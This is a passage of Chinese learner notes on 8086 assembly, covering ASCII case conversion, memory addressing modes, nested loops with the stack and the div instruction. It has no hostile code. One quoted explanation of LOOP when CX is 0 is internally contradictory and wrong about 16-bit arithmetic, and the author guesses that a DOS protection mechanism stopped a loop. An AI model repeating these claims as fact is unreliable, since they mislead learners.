1011</td><td>0153</td><td>107</td><td>0x6B</td><td>k</td><td>小写字母k</td></tr><tr><td>0110 1100</td><td>0154</td><td>108</td><td>0x6C</td><td>l</td><td>小写字母l</td></tr><tr><td>0110 1101</td><td>0155</td><td>109</td><td>0x6D</td><td>m</td><td>小写字母m</td></tr><tr><td>0110 1110</td><td>0156</td><td>110</td><td>0x6E</td><td>n</td><td>小写字母n</td></tr><tr><td>0110 1111</td><td>0157</td><td>111</td><td>0x6F</td><td>o</td><td>小写字母o</td></tr><tr><td>0111 0000</td><td>0160</td><td>112</td><td>0x70</td><td>p</td><td>小写字母p</td></tr><tr><td>0111 0001</td><td>0161</td><td>113</td><td>0x71</td><td>q</td><td>小写字母q</td></tr><tr><td>0111 0010</td><td>0162</td><td>114</td><td>0x72</td><td>r</td><td>小写字母r</td></tr><tr><td>0111 0011</td><td>0163</td><td>115</td><td>0x73</td><td>s</td><td>小写字母s</td></tr><tr><td>0111 0100</td><td>0164</td><td>116</td><td>0x74</td><td>t</td><td>小写字母t</td></tr><tr><td>0111 0101</td><td>0165</td><td>117</td><td>0x75</td><td>u</td><td>小写字母u</td></tr><tr><td>0111 0110</td><td>0166</td><td>118</td><td>0x76</td><td>v</td><td>小写字母v</td></tr><tr><td>0111 0111</td><td>0167</td><td>119</td><td>0x77</td><td>w</td><td>小写字母w</td></tr><tr><td>0111 1000</td><td>0170</td><td>120</td><td>0x78</td><td>x</td><td>小写字母x</td></tr><tr><td>0111 1001</td><td>0171</td><td>121</td><td>0x79</td><td>y</td><td>小写字母y</td></tr><tr><td>0111 1010</td><td>0172</td><td>122</td><td>0x7A</td><td>z</td><td>小写字母z</td></tr><tr><td>0111 1011</td><td>0173</td><td>123</td><td>0x7B</td><td>{</td><td>开花括号</td></tr><tr><td>0111 1100</td><td>0174</td><td>124</td><td>0x7C</td><td>|</td><td>垂线</td></tr><tr><td>0111 1101</td><td>0175</td><td>125</td><td>0x7D</td><td>}</td><td>闭花括号</td></tr><tr><td>0111 1110</td><td>0176</td><td>126</td><td>0x7E</td><td>~</td><td>波浪号</td></tr><tr><td>0111 1111</td><td>0177</td><td>127</td><td>0x7F</td><td>DEL (delete)</td><td>删除</td></tr></tbody></table><ul><li>一个文本编辑过程中，就包含着按照ASCII编码规则进行的编码和解码</li></ul><h3 id="7-3-以字符形式给出数据"><a href="#7-3-以字符形式给出数据" class="headerlink" title="7.3 以字符形式给出数据"></a>7.3 以字符形式给出数据</h3><ul><li>我们在汇编程序的过程中，用<code>&#39;.....&#39;</code>的方式指明数据是以字符的形式给出的，编译器将他们转化为相对应的ASCII码</li></ul><p>如</p><h3 id="7-4-大小写转换的问题"><a href="#7-4-大小写转换的问题" class="headerlink" title="7.4 大小写转换的问题"></a><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721150631078.png" alt="image-20240721150631078">7.4 大小写转换的问题</h3><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721151457943.png" alt="image-20240721151457943"></p><p>我们发现字母的大小ASCII码在二进制唯一的区别就是在第五位多了一个  <code>1</code>，也就是十六进制的大 <code>20H</code></p><p><strong>问题</strong></p><p>如果我们想将一个有大写有小写的英文如 <code>AbC</code> 全部转变成大写或小写怎么办?</p><p>这时就可以用我们之前学的 <code>and</code>和 <code>or</code>来解决问题了</p><ol><li>代码编写</li></ol><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240721155308744.png" alt="image-20240721155308744"></p><ol start="2"><li><p>编译连接，debug调试</p></li><li><p>我们先查看内存单元的数据</p></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721155430336.png" alt="image-20240721155430336"></p><ol start="4"><li><p>再将程序运行到第一个循环 <code>s</code>循环结束，再查看内存</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240721155700537.png" alt="image-20240721155700537"></p></li></ol><p>发现全部变大写的ascii码</p><ol start="5"><li><p>再将程序运行到第一个循环 <code>s0</code>循环结束，再查看内存</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721155812727.png" alt="image-20240721155812727"></p><p>发现全部变小写ascii码，这里有个问题，我忘了给cx再次赋值他居然没有立马停止循环而是cx的值变成fffe继续循环了79次在地址 076D：0039物理地址771F停下来了，而且cx的值还自动归零，我猜测这应该是dos系统的自我保护机制（这个后面要讲，记住有这个问题就行了）</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">小知识</span><br><span class="line">1、ascii编码是1个字节，而unicode编码通常是2个字节。2、ascii是单字节编码，无法用来表示中文；而unicode可以表示所有语言。3、用unicode编码比ascii编码需要多一倍的存储空间。</span><br><span class="line"></span><br><span class="line">Unicode 编码，因其支持全球多个国家的文字符号，故而称之为万国码。到现在为止，Unicode 编码已经有多个实施版本，具体有 UTF-8、UTF-16 和 UTF-32，UTF 缩写自Unicode Transformation Format，表示数据长度可变，通常一个 UTF-8 字符可以占 1~4 个字节。</span><br><span class="line"></span><br><span class="line">目前中文输入法通常使用的是 UTF-8</span><br><span class="line"></span><br><span class="line">使用ascii码无法表示中文，所以中文使用的是其他编码，故我们在编程的时候用中文输入法输入一些字符不能被识别</span><br></pre></td></tr></table></figure><h3 id="7-5-bx-idata"><a href="#7-5-bx-idata" class="headerlink" title="7.5 [bx+idata]"></a>7.5 [bx+idata]</h3><p>用[bx]的方式来指明一个内存单元，我们还可以用一种更为灵活的方式来指明内存单元</p><p>[bx+idata]表示一个内存单元，它的偏移地址为(bx)+idata(bx中的数值加上idata)</p><p><strong>mov ax,[bx+200]的含义</strong></p><ul><li>将一个内存单元的内容送入ax，这个内存单元的长度为2字节(字单元)，存放一个字，偏移地址为bx中的数值加上200，段地址在ds中。</li><li>数学化的描述为:(ax)&#x3D;((ds)*16+(bx)+200)</li></ul><p><strong>mov ax,[bx+200]不同的格式</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx+200]</span><br><span class="line">mov ax,[200+bx]</span><br><span class="line">mov ax,200[bx]</span><br><span class="line">mov ax,[bx].200</span><br></pre></td></tr></table></figure><h3 id="7-6-用-bx-idata-的方式进行数值的处理"><a href="#7-6-用-bx-idata-的方式进行数值的处理" class="headerlink" title="7.6 用[bx+idata]的方式进行数值的处理"></a>7.6 用[bx+idata]的方式进行数值的处理</h3><ul><li>有了[bx+idata]这种表示内存单元的方式，我们就可以用更高级的结构来看待所要处理的数据。</li></ul><p><strong>问题</strong></p><p>在7.4我们用了两个循环分别将一串字母全部转变为大写，全部转变为小写，那如果现在需要你在一次循环中将两串字母分别转化为大写的小写又该怎么处理？</p><p>我们可以用[idata1+bx]和[idata2+bx]的形式来解决问题</p><ol><li>编写代码</li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721165111992.png" alt="image-20240721165111992"></p><ol start="2"><li><p>编译连接，debug调试</p></li><li><p>先查看数据段内存</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721165223740.png" alt="image-20240721165223740"></p></li><li><p>运行程序到结束</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240721165341650.png" alt="image-20240721165341650"></p></li><li><p>检查内存，成功</p></li></ol><p><strong>C语言和汇编语言的定位方式</strong></p><p>C语言定位方式：a[i],b[i]</p><p>汇编语言定位方式：0[bx],5[bx]</p><h3 id="7-7-SI和DI"><a href="#7-7-SI和DI" class="headerlink" title="7.7 SI和DI"></a>7.7 SI和DI</h3><ul><li>SI和DI是8086CPU中和bx功能相近的寄存器，但是SI和DI不能够分成两个8位寄存器来使用</li></ul><p>以下三组指令实现了相同的功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. mov bx,0</span><br><span class="line">   mov ax,[bx]</span><br><span class="line">2. mov si,0</span><br><span class="line">   mov ax,[si]</span><br><span class="line">3. mov di,0</span><br><span class="line">   mov ax,[di]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. mov bx,0</span><br><span class="line">   mov ax,[bx+123]</span><br><span class="line">2. mov si,0</span><br><span class="line">   mov ax,[si+123]</span><br><span class="line">3. mov di,0</span><br><span class="line">   mov ax,[di+123]</span><br></pre></td></tr></table></figure><ul><li><p>功能 <code>si</code>和 <code>di</code>可以作为偏移地址快速的完成数据的复制</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240722174324706.png" alt="image-20240722174324706"></p><p>更简洁的代码</p></li></ul><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240722174243798.png" alt="image-20240722174243798"></p><p>更加灵活的方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[bx+si]</span><br><span class="line">[bx+di]</span><br></pre></td></tr></table></figure><h3 id="7-8-bx-si-和-bx-di"><a href="#7-8-bx-si-和-bx-di" class="headerlink" title="7.8 [bx+si]和[bx+di]"></a>7.8 [bx+si]和[bx+di]</h3><ul><li><p>[bx+si]表示一个内存单元，他的偏移地址为（bx）+（si）(表示bx中的值加上si中的数值)</p></li><li><p>指令mov ax,[bx+si]的含义:<br>将一个内存单元的内容送入ax，这个内存单元的长度为2字节(字单元)，存放一个字，偏移地址为bx中的数值加上si中的数值，段地址在ds中。</p><p>数字化：(ax)&#x3D;((ds)*16+(bx)+(si))</p><p>也可以这么写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bx][si]</span><br></pre></td></tr></table></figure></li></ul><p><strong>注意</strong></p><p>不能[di+si],[di] [si],[bx+ax]</p><h3 id="7-9-bx-si-idata-和-bx-di-idata"><a href="#7-9-bx-si-idata-和-bx-di-idata" class="headerlink" title="7.9 [bx+si+idata]和[bx+di+idata]"></a>7.9 [bx+si+idata]和[bx+di+idata]</h3><ul><li><p>[bx+si+idata]和[bx+di+idata]的含义相似，都表示一个内存单元</p></li><li><p>以[bx+si+idata]为例，他的偏移地址为 <code>(bx)+(si)+idata</code></p></li><li><p>指令mov ax,[bx+si+idata]的含义:<br>将一个内存单元的内容送入ax，这个内存单元的长度为2字节(字单元)，存放一个字，偏移地址为bx中的数值加上si中的数值再加上idata，段地址在ds中。</p><p>数字化：(ax)&#x3D;((ds)*16+(bx)+(si)+idata)</p><p>也可以这么写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,idata[bx][si]</span><br><span class="line">mov ax,[bx].idata[si]</span><br><span class="line">mov ax,[bx+idata+si]</span><br><span class="line">mov ax,[idata+bx+si]</span><br><span class="line">....//排列组合一共有12种</span><br><span class="line">注意常数在后面的时候前面要加.</span><br></pre></td></tr></table></figure></li></ul><h3 id="7-10-不同的寻址方式的灵活应用"><a href="#7-10-不同的寻址方式的灵活应用" class="headerlink" title="7.10 不同的寻址方式的灵活应用"></a>7.10 不同的寻址方式的灵活应用</h3><ul><li><p>我们以知道的几种寻址方式</p><ol><li>[idata]用一个常量来表示地址，可用于直接定位一个内存单元，但是这个在编写程序的时候不能直接使用，要加上段地址</li><li>[bx]用一个变量来表示内存地址，可用于间接定位一个内存单元</li><li>[bx+idata]用一个变量和常量表示地址，可在一个起始地址的基础上用变量间接定位一个内存单元</li><li>[bx+si]用两个变量表示地址</li><li>[bx+si+idata]用两个变量和一个常量表示地址</li></ol></li><li><p>从1到5我们逐渐用更加灵活的方式来定位一个内存单元，这使我们可以从更加结构化的角度来看待要处理的数据</p></li></ul><p><strong>问题</strong></p><p>将数据段每一个单词头一个字母改写为大写字母</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240722183536945.png" alt="image-20240722183536945"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240722183602716.png" alt="image-20240722183602716"></p><p>这时可以用一个变量来定位行，一个常量来定位列</p><p><strong>实验1</strong></p><p>将每个英文单词的第一个字母转为大写</p><ol><li><p>编写代码</p></li><li><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240722202257836.png" alt="image-20240722202257836">编译连接，debug调试</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240722202114170.png" alt="image-20240722202114170"></p></li><li><p>运行程序</p></li><li><p>查看数据段数据</p></li></ol><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20240722202353710.png" alt="image-20240722202353710"></p><p>发现第四位数据刚好减20H</p><p><strong>实验2</strong></p><p>将几个英语单词转化为大写</p><ol><li><p>编写代码</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240722211529049.png" alt="image-20240722211529049"></p></li><li><p>编译连接，debug调试</p></li><li><p>查看数据段内存</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240722205802838.png" alt="image-20240722205802838"></p></li><li><p>运行程序后查看内存</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240722210936662.png" alt="image-20240722210936662"></p></li><li><p>使用嵌套循环解决问题</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240722212509568.png" alt="image-20240722212509568"></p><p>我们发现cx出现了ffff的问题，因为嵌套循环，内层直接将cx归零了</p></li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240722211951784.png" alt="image-20240722211951784"></p><p> 但还是正常大写</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240722213845048.png" alt="image-20240722213845048"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240722213904442.png" alt="image-20240722213904442"></p><p>我们发现这种情况下没有循环了应该是触碰到了代码段</p><p><strong>解决cx:ffff的问题</strong></p><p> ffff的问题是一个bug，是因为loop机制的问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当CX=0时，LOOP指令将执行65536次。</span><br><span class="line"></span><br><span class="line">这个结论基于LOOP指令的工作原理。LOOP指令在执行时会检查CX寄存器的值。当CX=0时，指令首先会执行一次循环体内的语句，然后CX的值减1。由于此时CX的值为0，LOOP指令会再次检查CX的值，发现仍然为0（在16位系统中，0-1的结果仍然是0），因此会继续循环。这个过程会一直重复，直到达到16位无符号整数的最大值，即65535次。然而，由于初始时CX已经为0，所以实际上循环会多执行一次，总次数达到65536次。这个过程体现了LOOP指令在处理CX=0时的特殊行为，即先执行一次循环体内的语句，然后由于CX的值没有变化（仍然是0），导致无限循环，直到达到无符号整数的上限</span><br></pre></td></tr></table></figure><p><strong>嵌套循环要怎么办呢</strong></p><p>因为cx和loop是绑定的所以不能通过增加寄存器的方法来解决</p><p>我们可以选择把cx的值先保存下来，再结束内层循环的时候把cx的值恢复</p><p>代码实现</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240722223152752.png" alt="image-20240722223152752"></p><p>问题解决</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240722223206443.png" alt="image-20240722223206443"></p><p>但是si、cx、ax、bx，显然不能用来暂存cx中的值，因为这些寄存器在循环中也要使用;<br>cs、ip、ds也不能用，因为cs:ip时刻指向当前指令，ds指向数据段;<br>可用的就只有:dx、di、es、ss、sp、bp等6个寄存器了，但是这些寄存器也很少，使用寄存器并不是一个很好的解决方案</p><p>这时就可以使用内存来解决问题 </p><p>使用内存来暂存数据，这一点是确定了的，但是值得推敲的是，我们用怎样的结构来保存这些数据，而使得我们的程序更加清晰，更容易读懂和被接受?</p><p>这时候我们就可以用<strong>栈</strong></p><p><strong>使用栈来做嵌套循环</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240723141803429.png" alt="image-20240723141803429"></p><ol start="2"><li>…….</li><li><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240723141837244.png" alt="image-20240723141837244"></li></ol><h2 id="8-数据处理的两个基本问题"><a href="#8-数据处理的两个基本问题" class="headerlink" title="8 数据处理的两个基本问题"></a>8 数据处理的两个基本问题</h2><ul><li><p>计算机是进行数据处理，运算的机器，那么就有两个基本问题包含在其中</p><ol><li><p>处理的数据在什么地方</p></li><li><p>要处理的数据有多长</p></li></ol></li><li><p>这两个问题，在机器指令中必须给以明确或隐含的说明，否则计算机就无法工作</p></li><li><p>我们定义的描述性符号：reg和sreg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg：register寄存器</span><br><span class="line">sreg：segment register段寄存器</span><br></pre></td></tr></table></figure></li><li><ul><li><p>reg的集台包括:ax、bx、cx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di ;</p></li><li><p>sreg的集合包括:ds、ss、cs、es</p></li></ul></li></ul><h3 id="8-1-bx-si-di-bp"><a href="#8-1-bx-si-di-bp" class="headerlink" title="8.1 bx,si,di,bp"></a>8.1 bx,si,di,bp</h3><ul><li><p>在8086cpu中，只有这四个寄存器（bx，bp，si，di）可以用在<code>[...]</code>中来进行内存单元的寻址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">正确</span><br><span class="line">mov ax,[bx]</span><br><span class="line">mov ax,[bp]</span><br><span class="line">mov ax,[si]</span><br><span class="line">mov ax,[di]</span><br><span class="line">mov ax,[bp+si]</span><br><span class="line">mov ax,[bp+di]</span><br><span class="line">mov ax,[bx+si]</span><br><span class="line">mov ax,[bx+di]</span><br><span class="line">mov ax,[bp+si+idata]</span><br><span class="line">mov ax,[bp+di+idata]</span><br><span class="line">mov ax,[bx+si+idata]</span><br><span class="line">mov ax,[bx+di+idata]</span><br><span class="line">错误</span><br><span class="line">mov ax,[cx]</span><br><span class="line">mov ax,[ax]</span><br><span class="line">mov ax,[dx]</span><br><span class="line">mov ax,[ds]</span><br><span class="line">mov ax,[di+si]</span><br><span class="line">mov ax,[bx+bp]</span><br><span class="line">mov ax,[bx+si+di]</span><br></pre></td></tr></table></figure></li><li><p>只要在<code>[...]</code>中使用寄存器bp，而指令中没有显性的给出段地址，段地址就默认在ss中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[bp]</span><br><span class="line">含义:(ax)=((ss)*16+(bp))</span><br><span class="line">mov ax,[bp+idata]</span><br><span class="line">含义:(ax)=((ss)*16+(bp)+idata)</span><br><span class="line">mov ax,[bp+si]</span><br><span class="line">含义:(ax)=((ss)*16+(bp)+(si))</span><br><span class="line">mov ax,[bp+si+data]</span><br><span class="line">含义:(ax)=((ss)*16+(bp)+(si)+idata)</span><br></pre></td></tr></table></figure></li></ul><h3 id="8-2-机器指令处理的数据所在位置"><a href="#8-2-机器指令处理的数据所在位置" class="headerlink" title="8.2 机器指令处理的数据所在位置"></a>8.2 机器指令处理的数据所在位置</h3><ul><li><p>绝大部分机器指令都是进行数据处理的指令，处理大致可分为三类：</p><p><strong>读取，写入，运算</strong></p></li><li><p>在机器指令这一层来讲，并不关心数据的值是多少，而是关心指令执行前一刻，他要处理的数据所在的位置</p></li><li><p>指令在执行前，所要处理的数据可以在三个地方，cpu的内部，内存，端口</p></li></ul><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240723152747461.png" alt="image-20240723152747461"></p><h3 id="8-3-汇编语言中数据位置的表达"><a href="#8-3-汇编语言中数据位置的表达" class="headerlink" title="8.3 汇编语言中数据位置的表达"></a>8.3 汇编语言中数据位置的表达</h3><p>汇编语言中用三个概念来表达数据的位置</p><ol><li>立即数（idata）</li><li>寄存器</li><li>段地址（SA）和偏移地址（EA）</li></ol><p><strong>1. 立即数（idata）</strong></p><p>对于直接包含在机器指令中的数据（执行前在cpu的指令缓冲器中），在汇编语言中称为：立即数（idata），在汇编语言中直接给出。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax，1    机器码：B80100（B8表示mov ax ；0100表示0001）</span><br></pre></td></tr></table></figure><p><strong>2.寄存器</strong></p><p>指令要处理的数据在寄存器中，在汇编语言中给出相应的寄存器名。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,bx   机器码：89D8   执行结果：(ax)=(bx)</span><br></pre></td></tr></table></figure><p><strong>3.段寄存器（SA）和偏移寄存器（EA）</strong></p><p>指令要处理的数据在内存中，在汇编语言中可用[X]的格式给出EA，SA在某段寄存器中</p><ul><li>存放段地址的寄存器可以是默认的</li><li>存放段地址的寄存器也可以是显性的给出</li></ul><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">默认在ds</span><br><span class="line">mov ax,[bx]</span><br><span class="line">mov ax,[si]</span><br><span class="line">mov ax,[di]</span><br><span class="line">mov ax,[bx+si]</span><br><span class="line">mov ax,[bx+di]</span><br><span class="line">mov ax,[bx+si+idata]</span><br><span class="line">mov ax,[bx+di+idata]</span><br><span class="line">mov ax,[0]//在记事本编写的代码，还是不能被识别为偏移地址</span><br><span class="line">默认在ss</span><br><span class="line">mov ax,[bp]</span><br><span class="line">mov ax,[bp+si]</span><br><span class="line">mov ax,[bp+di]</span><br><span class="line">mov ax,[bp+si+idata]</span><br><span class="line">mov ax,[bp+di+idata]</span><br><span class="line">显性</span><br><span class="line">mov ax,ds:[bp]   含义:(ax)=((ds)*16+(bp))</span><br><span class="line">mov ax,es:[bx]   含义:(ax)=((es)*16+(bx))</span><br><span class="line">mov ax,ss:[bx+si]      含义:(ax)=((ss)*16+(bx)+(si))</span><br><span class="line">mov ax,cs:[bx+si+idata]含义:(ax)=((cs)*16+(bx)+(si)+idata)</span><br></pre></td></tr></table></figure><h3 id="8-4-寻址方式"><a href="#8-4-寻址方式" class="headerlink" title="8.4 寻址方式"></a>8.4 寻址方式</h3><ul><li>当数据存放在内存中的时候，我们可以用多种方式来给定这个内存单元的偏移地址，这种定位内存单元的方法一般被称为寻址方式。</li></ul><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240723155351825.png" alt="image-20240723155351825"></p><h3 id="8-5-指令要处理的数据有多长？"><a href="#8-5-指令要处理的数据有多长？" class="headerlink" title="8.5 指令要处理的数据有多长？"></a>8.5 指令要处理的数据有多长？</h3><ul><li><p>8086CPU的指令，可以处理两种尺寸的数据，byte和word。所以在机器指令中要指明，指令进行的是字操作还是字节操作。</p></li><li><p>如何确定指令有多长</p><ol><li><p>通过寄存器名指明要处理的数据的尺寸 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如</span><br><span class="line">mov ax,bx</span><br><span class="line">mov al,ds:[idata]</span><br></pre></td></tr></table></figure></li><li><p>在没有寄存器名存在的情况下，用操作符X ptr指明内存单元，X在汇编指令中可以为word或byte</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov word ptr ds:[0],1</span><br><span class="line">inc word ptr [bx]</span><br><span class="line">inc word ptr ds:[0]</span><br><span class="line">add word ptr [bx],2</span><br></pre></td></tr></table></figure><ul><li>在没有寄存器参与的内存单元访问指令中，用word ptr或byte ptr显性地指明所要访问的内存单元的长度是很必要的。</li><li>否则，cpu无法得知所要访问的单元是字单元，还是字节单元</li></ul></li><li><p>其他方法</p><p>有些指令默认了访问的是字节单元还是字单元，比如 ：</p><p><code>push [1000H]</code>就不用指明访问的是字单元还是字节单元，因为push指令只进行字操作</p></li></ol></li></ul><h3 id="8-6-寻址方式的综合应用"><a href="#8-6-寻址方式的综合应用" class="headerlink" title="8.6 寻址方式的综合应用"></a>8.6 寻址方式的综合应用</h3><p><strong>问题</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240723183715044.png" alt="image-20240723183715044"></p><p>我们要修改的数据</p><p>(1)(DEC公司记录)的(排名字段)</p><p>(2)(DEC公司记录)的(收入字段)</p><p>(3)(DEC公司记录)的(产品字段)的(第一个字符)、(第二个字符)、(第三个字符)</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240723183830627.png" alt="image-20240723183830627"></p><p>修改方法</p><p>(1)我们要访问的数据是DEC公司的记录，所以，首先要确定DEC公司记录的位置R&#x3D;seg:60<br>确定了公司记录的位置后，我们下面就进一步确定要访问的内容在记录中的位置。</p><p>(2)确定排名字段在记录中的位置:0CH</p><p>(3)修改R+0CH处的数据。</p><p>(4)确定收入字段在记录中的位置:0EH</p><p>(5)修改R+0EH处的数据。</p><p>(6)确定产品字段在记录中的位置:10H。修改的产品字段是一个字符串(或一个数组)，需要访问字符串中的每一个字符。所以我们要进一步确定每一个字符在字符串中的位置。</p><p>(7)确定第一个字符在产品字段中的位置:P&#x3D;0。</p><p>(8)修改R+10H+P处的数:P&#x3D;P+1。</p><p>(9)修改R+10H+P处的数:P&#x3D;P+1。</p><p>(10)…</p><p>程序实现</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240723184550349.png" alt="image-20240723184550349"></p><p>对比C语言</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240723184630444.png" alt="image-20240723184630444"></p><ul><li><p>我们可以看到，8086CPU提供的如[bx+si+idata]的寻址方式为结构化数据的处理提供了方便。</p></li><li><p>使得我们可以在编程的时候，从结构化的角度去看待所要处理的数据。</p></li><li><p>从上面我们可以看到，一个结构化的数据包合了多个数据项，而数据项的类型又不相同，有的是字型数据，有的是字节型数据，有的是数组(字符串)</p></li><li><p>一般来说，我们可以用[bx+idata+si]的方式来访问结构体中的数据。</p><p><strong>用bx定位整个结构体，用idata定位结构体中的某一个数据项，用si定位数组项中的每个元素</strong></p></li><li><p>在C语言程序中我们看到，如:dec.cp[i]，deg是一个变量名，指明了结构体变量的地址，cp是一个名称，指明了数据项cp的地址，而i用来定位cp中的每一个字符。<br>汇编语言中的做法是:bx.10h[si]</p></li></ul><h3 id="8-7-div指令"><a href="#8-7-div指令" class="headerlink" title="8.7 div指令"></a>8.7 div指令</h3><ul><li><p>div是除法指令(division)，使用div作除法的时候</p><ul><li><p>除数：8位或16位，在寄存器或内存单元中</p></li><li><p>被除数：（默认）放在AX或DX和AX中</p></li><li><p>商：如果被除数为16位，进行除法运算时al保存商，ah保存余数。如果被除数为32位时，进行除法运算时，ax保存商，dx保存余数</p><table><thead><tr><th>除数</th><th>被除数</th><th>商</th><th>余数</th></tr></thead><tbody><tr><td>8位</td><td>16位（AX）</td><td>AL</td><td>AH</td></tr><tr><td>16位</td><td>32位（DX+AX）</td><td>AX</td><td>DX</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">为什么被除数要比除数大</span><br><span class="line">16位的数据除8位的数据时，最终得到的商可能大于8位，al保存不下会产生除法溢出。</span><br></pre></td></tr></table></figure></li></ul></li><li><p>div指令格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div reg</span><br><span class="line">div 内存单元</span><br></pre></td></tr></table></figure></li><li><p>div指令示例</p><ul><li><pre><code>div byte ptr ds:[0]含义为：(al)=(ax)/((ds)*16+0)的商(ah)=(ax)/((ds)*16+0)的余数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span 